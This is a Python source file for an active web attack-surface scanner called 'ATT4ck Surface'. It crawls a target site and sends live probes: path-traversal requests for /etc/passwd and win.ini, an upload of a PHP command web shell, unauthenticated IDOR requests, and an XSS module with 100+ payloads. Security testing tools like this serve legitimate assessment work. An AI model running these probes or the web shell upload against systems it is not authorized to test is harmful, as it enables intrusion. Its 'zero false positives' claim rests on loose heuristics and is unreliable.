#!/usr/bin/env python3
"""
ATT4ck Surface - Attack Surface Scanner
The Deadliest Security Scanner - Zero False Positives
"""

import sys
import os
import tempfile
import re
import requests
import urllib.parse
from datetime import datetime
from typing import List, Dict, Optional
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn

from attack_surface.banner import print_banner, print_startup, print_environment
from attack_surface.scanner import SurfaceScanner, verify_endpoint, export_results
from attack_surface.xss_scanner import XSSScanner, XSS_PAYLOADS
from attack_surface.web_crawler import WebCrawler

# Import all surface rules
from attack_surface.api_surface.api import API_RULES
from attack_surface.communication_surface.communications import COMMUNICATIONS_RULES
from attack_surface.file_surface.file import FILE_RULES
from attack_surface.frontend_surface.frontend import FRONTEND_RULES
from attack_surface.iam_surface.iam import IAM_RULES
from attack_surface.infrastructure_surface.infrastructure import INFRASTRUCTURE_RULES
from attack_surface.input_surface.input import INPUT_RULES
from attack_surface.secret_surface.secret import SECRETS_RULES

# Try to import Next.js scanner
try:
    from attack_surface.nextjs_scanner import scan_nextjs
    NEXTJS_AVAILABLE = True
except ImportError:
    NEXTJS_AVAILABLE = False
    print("[WARN] Next.js scanner not available")

console = Console()

# ============================================================================
# BUILD ARTIFACT FILTERS
# ============================================================================

BUILD_ARTIFACT_PATTERNS = [
    r'/_next/',
    r'/static/',
    r'/chunks/',
    r'/images/',
    r'/fonts/',
    r'/icons/',
    r'/favicon\.',
    r'/manifest\.',
    r'\.woff2?$',
    r'\.ttf$',
    r'\.eot$',
    r'\.svg$',
    r'\.png$',
    r'\.jpg$',
    r'\.jpeg$',
    r'\.gif$',
    r'\.ico$',
    r'\.webp$',
    r'\.css$',
    r'\.map$',
    r'__next',
    r'webpack',
    r'chunk-',
    r'framework-',
    r'polyfills',
    r'runtime',
    r'vendor',
]

# ============================================================================
# BUILD PATTERNS FROM ALL SURFACE RULES
# ============================================================================

def extract_patterns_from_rules(rules: List[Dict]) -> List[str]:
    """Extract vulnerability patterns from surface rules"""
    patterns = []
    for rule in rules:
        patterns.extend(rule.get("vuln_patterns", []))
    return patterns

# Build comprehensive pattern lists from all surfaces
ALL_SURFACE_RULES = (
    API_RULES + 
    COMMUNICATIONS_RULES + 
    FILE_RULES + 
    FRONTEND_RULES + 
    IAM_RULES + 
    INFRASTRUCTURE_RULES + 
    INPUT_RULES + 
    SECRETS_RULES
)

# Extract patterns by category
DISCOVERY_PATTERNS = extract_patterns_from_rules(API_RULES)
SECRETS_PATTERNS = extract_patterns_from_rules(SECRETS_RULES)
FILE_PATTERNS = extract_patterns_from_rules(FILE_RULES)
API_PATTERNS = extract_patterns_from_rules(API_RULES)
MISCONFIG_PATTERNS = extract_patterns_from_rules(INFRASTRUCTURE_RULES)
XSS_PATTERNS = [p for rule in INPUT_RULES for p in rule.get("vuln_patterns", []) if "xss" in rule.get("category", "").lower()]

# Add unique patterns
DISCOVERY_PATTERNS = list(set(DISCOVERY_PATTERNS))
SECRETS_PATTERNS = list(set(SECRETS_PATTERNS))
FILE_PATTERNS = list(set(FILE_PATTERNS))
API_PATTERNS = list(set(API_PATTERNS))
MISCONFIG_PATTERNS = list(set(MISCONFIG_PATTERNS))
XSS_PATTERNS = list(set(XSS_PATTERNS))

# ============================================================================
# FEATURE MAPPING
# ============================================================================

FEATURES = {
    "1": {
        "name": "Endpoint Discovery", 
        "description": "Discover hidden endpoints", 
        "patterns": DISCOVERY_PATTERNS, 
        "severity": "MEDIUM"
    },
    "2": {
        "name": "Secrets Detection", 
        "description": "Find hardcoded secrets", 
        "patterns": SECRETS_PATTERNS, 
        "severity": "CRITICAL"
    },
    "3": {
        "name": "File Analysis", 
        "description": "Analyze file operations", 
        "patterns": FILE_PATTERNS, 
        "severity": "HIGH"
    },
    "4": {
        "name": "API Enumeration", 
        "description": "Discover API endpoints", 
        "patterns": API_PATTERNS, 
        "severity": "MEDIUM"
    },
    "5": {
        "name": "Security Misconfigurations", 
        "description": "Find misconfigurations", 
        "patterns": MISCONFIG_PATTERNS, 
        "severity": "HIGH"
    },
    "6": {
        "name": "XSS & Parameter Mapping", 
        "description": "Comprehensive XSS testing with 100+ payloads", 
        "patterns": XSS_PATTERNS, 
        "severity": "CRITICAL"
    },
    "7": {
        "name": "Full Scan", 
        "description": "Comprehensive analysis", 
        "patterns": None, 
        "severity": "ALL"
    },
}


def is_build_artifact(endpoint: str) -> bool:
    for pattern in BUILD_ARTIFACT_PATTERNS:
        if re.search(pattern, endpoint, re.IGNORECASE):
            return True
    return False


def display_menu():
    console.print("\n")
    console.print(Panel(
        "[cyan]1.[/cyan] Endpoint Discovery - Find hidden endpoints\n"
        "[cyan]2.[/cyan] Secrets Detection - Find hardcoded secrets\n"
        "[cyan]3.[/cyan] File Analysis - Analyze file operations\n"
        "[cyan]4.[/cyan] API Enumeration - Discover API endpoints\n"
        "[cyan]5.[/cyan] Security Misconfigurations - Find misconfigs\n"
        "[cyan]6.[/cyan] XSS & Parameter Mapping - Find XSS vectors\n"
        "[cyan]7.[/cyan] Full Scan - Comprehensive analysis",
        title="ATT&CK Surface Scanner",
        width=70
    ))
    return Prompt.ask("Select scan mode", choices=["1","2","3","4","5","6","7"], default="7")


def is_web_url(url: str) -> bool:
    return url.startswith("http://") or url.startswith("https://")


# ============================================================================
# ACTIVE TESTING FUNCTIONS FOR EACH MODE
# ============================================================================

def test_secrets_active(url: str) -> List[Dict]:
    """Actively test for hardcoded secrets"""
    findings = []
    console.print("[cyan]🔍 Actively testing for hardcoded secrets...[/cyan]")
    
    try:
        response = requests.get(url, timeout=10)
        html = response.text
        
        secret_patterns = [
            (r'API_KEY\s*=\s*["\']([^"\']+)["\']', 'API Key'),
            (r'JWT_SECRET\s*=\s*["\']([^"\']+)["\']', 'JWT Secret'),
            (r'sk-[a-zA-Z0-9]{20,}', 'OpenAI API Key'),
            (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),
            (r'webhook_secret\s*[:=]\s*["\']([^"\']+)["\']', 'Webhook Secret'),
            (r'password\s*[:=]\s*["\']([^"\']+)["\']', 'Password'),
        ]
        
        for pattern, name in secret_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                if match:
                    findings.append({
                        "finding_id": f"SEC-{len(findings)}",
                        "category": "secrets",
                        "name": f"Hardcoded {name}",
                        "description": f"Found {name}: {match[:30]}...",
                        "severity": "CRITICAL",
                        "confidence": 100,
                        "file": url,
                        "line": 0,
                        "snippet": match[:100],
                        "status": "VULNERABLE",
                        "timestamp": datetime.now().isoformat()
                    })
                    console.print(f"[red]✗ Hardcoded {name} found: {match[:30]}...[/red]")
    except Exception as e:
        console.print(f"[dim]Secrets test error: {e}[/dim]")
    
    return findings


def test_file_operations_active(url: str) -> List[Dict]:
    """Actively test for file operation vulnerabilities"""
    findings = []
    console.print("[cyan]🔍 Actively testing for file vulnerabilities...[/cyan]")
    
    # Test Path Traversal
    traversal_payloads = [
        "../../../../etc/passwd",
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
    ]
    
    for payload in traversal_payloads:
        test_url = f"{url}/download?file={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, timeout=5)
            if "root:" in response.text or "Windows" in response.text:
                findings.append({
                    "finding_id": f"FIL-{len(findings)}",
                    "category": "file",
                    "name": "Path Traversal",
                    "description": f"File access: {payload}",
                    "severity": "HIGH",
                    "confidence": 90,
                    "file": test_url,
                    "line": 0,
                    "snippet": response.text[:200],
                    "status": "VULNERABLE",
                    "timestamp": datetime.now().isoformat()
                })
                console.print(f"[red]✗ Path Traversal found: {payload}[/red]")
                break
        except:
            pass
    
    # Test File Upload
    try:
        files = {'file': ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php')}
        response = requests.post(f"{url}/upload", files=files, timeout=5)
        if "uploaded" in response.text.lower() or "success" in response.text.lower():
            findings.append({
                "finding_id": f"FIL-{len(findings)}",
                "category": "file",
                "name": "Unrestricted File Upload",
                "description": "Uploaded PHP file successfully",
                "severity": "HIGH",
                "confidence": 85,
                "file": f"{url}/upload",
                "line": 0,
                "snippet": response.text[:200],
                "status": "VULNERABLE",
                "timestamp": datetime.now().isoformat()
            })
            console.print(f"[red]✗ Unrestricted File Upload found[/red]")
    except:
        pass
    
    return findings


def test_api_active(url: str) -> List[Dict]:
    """Actively test for API vulnerabilities"""
    findings = []
    console.print("[cyan]🔍 Actively testing API endpoints...[/cyan]")
    
    endpoints = [
        "/api/users",
        "/api/graphql",
        "/api/webhook",
        "/api/profile",
    ]
    
    for endpoint in endpoints:
        test_url = f"{url}{endpoint}"
        try:
            response = requests.get(test_url, timeout=5)
            if response.status_code == 200:
                # Check for sensitive data
                if "password" in response.text or "secret" in response.text:
                    findings.append({
                        "finding_id": f"API-{len(findings)}",
                        "category": "api",
                        "name": f"Sensitive Data Exposure in {endpoint}",
                        "description": "API exposes sensitive data",
                        "severity": "HIGH",
                        "confidence": 85,
                        "file": test_url,
                        "line": 0,
                        "snippet": response.text[:200],
                        "status": "VULNERABLE",
                        "timestamp": datetime.now().isoformat()
                    })
                    console.print(f"[red]✗ Sensitive data in {endpoint}[/red]")
                
                # Check for IDOR
                if "/users" in endpoint or "/profile" in endpoint:
                    id_test = f"{test_url}/1"
                    try:
                        id_response = requests.get(id_test, timeout=5)
                        if id_response.status_code == 200 and "user" in id_response.text.lower():
                            findings.append({
                                "finding_id": f"API-{len(findings)}",
                                "category": "api",
                                "name": f"IDOR in {endpoint}",
                                "description": "Access to user ID 1 without auth",
                                "severity": "HIGH",
                                "confidence": 80,
                                "file": id_test,
                                "line": 0,
                                "snippet": id_response.text[:200],
                                "status": "VULNERABLE",
                                "timestamp": datetime.now().isoformat()
                            })
                            console.print(f"[red]✗ IDOR found in {endpoint}[/red]")
                    except:
                        pass
        except:
            pass
    
    return findings


def test_misconfig_active(url: str) -> List[Dict]:
    """Actively test for security misconfigurations"""
    findings = []
    console.print("[cyan]🔍 Actively testing for misconfigurations...[/cyan]")
    
    # Test CORS
    try:
        headers = {'Origin': 'https://attacker.com'}
        response = requests.options(f"{url}/api/users", headers=headers, timeout=5)
        origin = response.headers.get('Access-Control-Allow-Origin', '')
        if origin == '*':
            findings.append({
                "finding_id": f"MIS-{len(findings)}",
                "category": "misconfig",
                "name": "Wildcard CORS",
                "description": "CORS allows any origin",
                "severity": "MEDIUM",
                "confidence": 95,
                "file": f"{url}/api/users",
                "line": 0,
                "snippet": f"Access-Control-Allow-Origin: {origin}",
                "status": "VULNERABLE",
                "timestamp": datetime.now().isoformat()
            })
            console.print(f"[red]✗ Wildcard CORS found[/red]")
    except:
        pass
    
    # Test Admin Panel
    try:
        response = requests.get(f"{url}/admin", timeout=5)
        if response.status_code == 200 and ("Admin" in response.text or "Dashboard" in response.text):
            findings.append({
                "finding_id": f"MIS-{len(findings)}",
                "category": "misconfig",
                "name": "Unprotected Admin Panel",
                "description": "Admin panel accessible without auth",
                "severity": "CRITICAL",
                "confidence": 100,
                "file": f"{url}/admin",
                "line": 0,
                "snippet": response.text[:200],
                "status": "VULNERABLE",
                "timestamp": datetime.now().isoformat()
            })
            console.print(f"[red]✗ Unprotected Admin Panel found[/red]")
    except:
        pass
    
    # Test Debug Mode
    try:
        response = requests.get(url, timeout=5)
        if "debug" in response.text.lower() and "true" in response.text.lower():
            findings.append({
                "finding_id": f"MIS-{len(findings)}",
                "category": "misconfig",
                "name": "Debug Mode Enabled",
                "description": "Debug mode is enabled in production",
                "severity": "HIGH",
                "confidence": 80,
                "file": url,
                "line": 0,
                "snippet": "Debug: True",
                "status": "VULNERABLE",
                "timestamp": datetime.now().isoformat()
            })
            console.print(f"[red]✗ Debug Mode enabled[/red]")
    except:
        pass
    
    return findings


def scan_web_url(url: str, mode: str, patterns: List[str]) -> List[Dict]:
    console.print(Panel(f"[magenta]Web Target[/magenta] {url}"))
    
    temp_dir = tempfile.mkdtemp()
    all_findings = []
    verified_endpoints = set()
    
    try:
        console.print("[cyan]Fetching HTML content...[/cyan]")
        html_content = ""
        try:
            response = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            if response.status_code == 200:
                html_content = response.text
                console.print("[green]HTML content fetched successfully[/green]")
        except Exception as e:
            console.print(f"[yellow]Could not fetch HTML: {e}[/yellow]")
        
        # Scan HTML with patterns (Passive)
        if html_content and patterns:
            console.print(f"[cyan]Scanning HTML with {len(patterns)} patterns...[/cyan]")
            for line_idx, line in enumerate(html_content.split('\n'), 1):
                line = line.strip()
                if not line or len(line) < 10:
                    continue
                for pattern in patterns:
                    try:
                        matches = re.findall(pattern, line, re.IGNORECASE)
                        for match in matches:
                            if isinstance(match, tuple):
                                match = match[0] if match else ""
                            if match and len(str(match)) > 3:
                                potential = str(match)
                                if potential.startswith('/'):
                                    full_url = url.rstrip('/') + potential
                                    if verify_endpoint(full_url):
                                        key = f"{potential}"
                                        if key not in verified_endpoints:
                                            verified_endpoints.add(key)
                                            all_findings.append({
                                                "finding_id": f"EP-{len(all_findings)}",
                                                "cwe": "N/A",
                                                "category": mode,
                                                "name": "Verified Endpoint Found",
                                                "file": url,
                                                "line": line_idx,
                                                "snippet": line[:200],
                                                "status": "VULNERABLE",
                                                "severity": FEATURES.get(mode, {}).get("severity", "MEDIUM"),
                                                "confidence": 95,
                                                "description": f"Verified: {potential} (200 OK)",
                                                "timestamp": datetime.now().isoformat()
                                            })
                                    elif is_build_artifact(potential):
                                        continue
                    except re.error:
                        pass
        
        console.print("[cyan]Crawling website...[/cyan]")
        crawler = WebCrawler(url, max_pages=30)
        data = crawler.crawl()
        console.print(f"[green]Found: {len(data.get('js_files', []))} JS files, {len(data.get('endpoints', []))} endpoints[/green]")
        
        js_output_dir = os.path.join(temp_dir, "js_files")
        os.makedirs(js_output_dir, exist_ok=True)
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Downloading JS files...", total=len(data.get('js_files', [])))
            downloaded = crawler.download_js_files(js_output_dir)
            progress.update(task, completed=len(data.get('js_files', [])))
        
        console.print(f"[green]Downloaded {len(downloaded)} JS files[/green]")
        
        if downloaded and patterns:
            console.print(f"[cyan]Scanning JS files with {len(patterns)} patterns...[/cyan]")
            for js_file in downloaded:
                try:
                    with open(js_file, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        lines = content.split('\n')
                    
                    if len(lines) < 5 and len(content) > 10000:
                        continue
                    
                    for line_idx, line in enumerate(lines, 1):
                        line = line.strip()
                        if not line or len(line) < 10:
                            continue
                        if any(skip in line for skip in ['console.log', 'console.error', 'module.exports', 'export default', 'import React']):
                            continue
                        for pattern in patterns:
                            try:
                                matches = re.findall(pattern, line, re.IGNORECASE)
                                for match in matches:
                                    if isinstance(match, tuple):
                                        match = match[0] if match else ""
                                    if match and len(str(match)) > 3:
                                        potential = str(match)
                                        if potential.startswith('/'):
                                            full_url = url.rstrip('/') + potential
                                            if verify_endpoint(full_url):
                                                key = f"{potential}"
                                                if key not in verified_endpoints:
                                                    verified_endpoints.add(key)
                                                    all_findings.append({
                                                        "finding_id": f"EP-{len(all_findings)}",
                                                        "cwe": "N/A",
                                                        "category": mode,
                                                        "name": "Verified Endpoint in JS",
                                                        "file": os.path.basename(js_file),
                                                        "line": line_idx,
                                                        "snippet": line[:200],
                                                        "status": "VULNERABLE",
                                                        "severity": FEATURES.get(mode, {}).get("severity", "MEDIUM"),
                                                        "confidence": 90,
                                                        "description": f"Verified: {potential} (200 OK)",
                                                        "timestamp": datetime.now().isoformat()
                                                    })
                                            elif is_build_artifact(potential):
                                                continue
                            except re.error:
                                pass
                except Exception as e:
                    pass
        
        # ============================================================
        # ACTIVE TESTING FOR EACH MODE
        # ============================================================
        
        # Mode 1: Endpoint Discovery
        if mode == "1" or mode == "7":
            console.print("[cyan]Scanning discovered endpoints with verification...[/cyan]")
            for endpoint in data.get('endpoints', []):
                if is_build_artifact(endpoint) or endpoint in verified_endpoints:
                    continue
                full_url = url.rstrip('/') + endpoint
                if verify_endpoint(full_url):
                    verified_endpoints.add(endpoint)
                    all_findings.append({
                        "finding_id": f"EP-{len(all_findings)}",
                        "cwe": "N/A",
                        "category": "endpoint",
                        "name": "Verified Discovered Endpoint",
                        "file": url,
                        "line": 0,
                        "snippet": endpoint[:200],
                        "status": "VULNERABLE",
                        "severity": "MEDIUM",
                        "confidence": 95,
                        "description": f"Verified: {endpoint} (200 OK)",
                        "timestamp": datetime.now().isoformat()
                    })
        
        # Mode 2: Secrets Detection (Active)
        if mode == "2":
            secret_findings = test_secrets_active(url)
            all_findings.extend(secret_findings)
        
        # Mode 3: File Analysis (Active)
        if mode == "3":
            file_findings = test_file_operations_active(url)
            all_findings.extend(file_findings)
        
        # Mode 4: API Enumeration (Active)
        if mode == "4":
            api_findings = test_api_active(url)
            all_findings.extend(api_findings)
        
        # Mode 5: Security Misconfigurations (Active)
        if mode == "5":
            misconfig_findings = test_misconfig_active(url)
            all_findings.extend(misconfig_findings)
        
        # Mode 6: XSS Active Testing
        if mode == "6":
            console.print("[bold red]🔥 Running Comprehensive XSS Scan...[/bold red]")
            console.print("[yellow]Testing 100+ XSS payloads across all parameters...[/yellow]")
            xss_scanner = XSSScanner(url)
            xss_results = xss_scanner.scan()
            all_findings.extend(xss_results)
            xss_scanner.render_results()
        
        # Mode 7: Next.js Vulnerability Scan
        if mode == "7" and NEXTJS_AVAILABLE:
            console.print("[bold red]🔥 Running Next.js Vulnerability Scan...[/bold red]")
            nextjs_findings = scan_nextjs(url)
            if nextjs_findings:
                all_findings.extend(nextjs_findings)
                console.print(f"[green]Found {len(nextjs_findings)} Next.js vulnerabilities[/green]")
        
        if all_findings:
            console.print(f"[green]Found {len(all_findings)} verified findings[/green]")
            export_results(all_findings, "output")
        else:
            console.print("[yellow]No verified findings found[/yellow]")
            export_results([], "output")
        
        return all_findings
        
    except Exception as e:
        console.print(f"[red]Scan failed: {e}[/red]")
        import traceback
        traceback.print_exc()
        return []
    
    finally:
        console.print(f"[dim]Temp dir: {temp_dir}[/dim]")


def render_results(results: List[Dict], mode_name: str):
    if not results:
        console.print("\n[green]✅ No vulnerabilities found![/green]")
        return
    
    severity_count = {}
    category_count = {}
    for r in results:
        severity = r.get('severity', 'MEDIUM')
        severity_count[severity] = severity_count.get(severity, 0) + 1
        category = r.get('category', 'UNKNOWN')
        category_count[category] = category_count.get(category, 0) + 1
    
    console.print(f"\n[bold cyan]📊 Scan Summary - {mode_name}[/bold cyan]")
    
    summary_table = Table(title="Findings by Severity")
    summary_table.add_column("Severity", style="bold")
    summary_table.add_column("Count", justify="right")
    for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
        count = severity_count.get(severity, 0)
        if count > 0:
            color = {'CRITICAL': 'red', 'HIGH': 'orange1', 'MEDIUM': 'yellow'}.get(severity, 'white')
            summary_table.add_row(f'[{color}]{severity}[/{color}]', str(count))
    console.print(summary_table)
    
    cat_table = Table(title="Findings by Category")
    cat_table.add_column("Category", style="cyan")
    cat_table.add_column("Count", justify="right")
    for category, count in sorted(category_count.items(), key=lambda x: -x[1]):
        cat_table.add_row(category, str(count))
    console.print(cat_table)
    
    console.print(f"\n[bold]📋 Detailed Findings ({len(results)})[/bold]")
    table = Table(show_header=True, header_style="bold magenta")
    table.add_column("ID", style="dim", width=8)
    table.add_column("Severity", width=10)
    table.add_column("Category", width=12)
    table.add_column("Location", width=25)
    table.add_column("Description", width=50)
    
    for r in results[:100]:
        severity = r.get('severity', 'MEDIUM')
        color = {'CRITICAL': 'red', 'HIGH': 'orange1', 'MEDIUM': 'yellow'}.get(severity, 'white')
        location = r.get('file', '')
        if r.get('line', 0) > 0:
            location += f":{r.get('line')}"
        table.add_row(
            r.get('finding_id', 'N/A')[:6],
            f'[{color}]{severity}[/{color}]',
            r.get('category', 'N/A')[:10],
            location[:23],
            r.get('description', 'N/A')[:48]
        )
    console.print(table)
    export_results(results, "output")
    console.print(f"\n[green]✅ Results saved to output/findings.json[/green]")


def main():
    print_banner()
    print_startup()
    print_environment()
    
    target = sys.argv[1] if len(sys.argv) > 1 else Prompt.ask("Target URL (e.g., https://example.com)")
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    choice = display_menu()
    mode_info = FEATURES[choice]
    
    console.print(f"\n[bold cyan]Mode:[/bold cyan] {mode_info['name']}")
    console.print(f"[dim]{mode_info['description']}[/dim]")
    
    if mode_info['patterns'] is None:
        all_patterns = []
        for key, feature in FEATURES.items():
            if key != "7" and feature.get('patterns'):
                all_patterns.extend(feature['patterns'])
        patterns = list(set(all_patterns))
        console.print(f"[yellow]Rules Loaded:[/yellow] {len(patterns)} (All categories)")
    else:
        patterns = mode_info['patterns']
        console.print(f"[yellow]Rules Loaded:[/yellow] {len(patterns)}")
    
    console.print("-" * 80)
    results = scan_web_url(target, choice, patterns)
    render_results(results, mode_info['name'])


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[red]Scan interrupted by user[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        import traceback
        traceback.print_exc()
        sys.exit(1)